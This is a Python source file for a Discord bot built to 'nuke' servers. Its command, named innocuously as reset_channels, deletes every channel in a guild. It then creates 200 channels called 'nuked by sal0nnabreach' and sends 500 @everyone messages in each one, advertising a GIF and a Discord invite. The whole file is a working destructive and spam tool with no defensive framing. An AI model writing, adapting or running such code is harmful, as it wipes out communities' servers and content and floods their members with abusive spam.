import discord
from discord.ext import commands
import asyncio  
TOKEN = 'YOUR_BOT_TOKEN'

intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.message_content = True  
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Bot {bot.user} is ready to nuke!')

async def create_channel_with_messages(guild, role_everyone, admin_role):
    channel_name = "nuked by sal0nnabreach"

    overwrites = {
        role_everyone: discord.PermissionOverwrite(read_messages=True, send_messages=False), 
        admin_role: discord.PermissionOverwrite(read_messages=True, send_messages=True) 
    }

    channel = await guild.create_text_channel(name=channel_name, overwrites=overwrites)

    message_content = """@everyone Nuked by https://cdn.discordapp.com/attachments/1288483339350835226/1288483941753421835/IMG_3462.gif?ex=66f559ae&is=66f4082e&hm=2d973cd5ccba4218b2144ff147de05b24f5b63d9b0b23aa7a12b49eb4f6912a2&
https://discord.gg/Dz8H5dtgnH"""

    for _ in range(500):
        await channel.send(message_content)

    print(f'Nuked succesfully in {channel_name}.')

@bot.command()
@commands.has_permissions(administrator=True) 
async def reset_channels(ctx):
    guild = ctx.guild 

    await ctx.send("I'm nuking, please wait...")

    print("I'm nuking...")
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f'Channel {channel.name} removed succesfully.')
        except Exception as e:
            print(f'Error at\remove the channel {channel.name}: {e}')

    role_everyone = guild.default_role
    admin_role = discord.utils.get(guild.roles, permissions=discord.Permissions(administrator=True))

    tasks = []

    print("Start nuking...")
    for _ in range(200):  
        tasks.append(create_channel_with_messages(guild, role_everyone, admin_role))

    await asyncio.gather(*tasks)

    await ctx.send("Nuked succesfully.")

bot.run(TOKEN)
